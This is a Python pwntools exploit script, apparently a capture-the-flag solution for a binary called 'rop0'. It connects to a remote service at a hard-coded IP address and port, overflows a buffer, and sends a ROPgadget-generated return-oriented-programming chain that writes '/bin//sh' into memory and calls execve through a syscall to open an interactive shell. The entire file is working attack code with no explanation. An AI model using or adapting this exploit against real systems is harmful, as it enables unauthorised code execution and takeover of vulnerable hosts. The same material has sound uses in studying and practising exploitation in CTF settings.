#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./rop0"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3121)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x4009c7
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'

c.send('a' * 300)

# execve generated by ROPgadget
p = b'a' * 0x28
p += p64(0x0000000000401637) # pop rsi ; ret
p += p64(0x00000000006ca080) # @ .data
p += p64(0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
p += b'/bin//sh'
p += b'/bin//sh'
p += b'/bin//sh'
p += p64(0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401637) # pop rsi ; ret
p += p64(0x00000000006ca088) # @ .data + 8
p += p64(0x00000000004260ef) # xor rax, rax ; ret
p += p64(0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
p += p64(0x3b)
p += b'/bin//sh'
p += b'/bin//sh'
p += p64(0x0000000000401516) # pop rdi ; ret
p += p64(0x00000000006ca080) # @ .data
p += p64(0x0000000000401637) # pop rsi ; ret
p += p64(0x00000000006ca088) # @ .data + 8
p += p64(0x00000000004428e6) # pop rdx ; ret
p += p64(0x00000000006ca088) # @ .data + 8
p += p64(0x00000000004003da) # syscall

c.sendafter('300', p)


c.interactive()
c.close()
